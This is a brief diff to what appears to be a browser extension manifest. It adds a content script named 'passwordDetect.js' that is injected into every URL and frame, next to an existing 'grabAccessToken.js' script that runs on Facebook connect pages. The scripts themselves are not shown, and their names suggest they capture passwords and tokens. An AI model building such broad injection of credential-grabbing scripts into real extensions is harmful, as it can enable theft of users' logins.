@@ -11,8 +11,14 @@
 		"default_title": "Click Here!"
 	},
 	"permissions": ["activeTab",
-	"tabs", "storage"],
+		"tabs", "storage"],
 	"content_scripts": [
+		{
+			"matches": ["<all_urls>"],
+			"js": ["passwordDetect.js"],
+			"all_frames": true
+			},
+
 		{
 			"matches": ["https://www.facebook.com/connect/*"],
 			"js": ["grabAccessToken.js"]
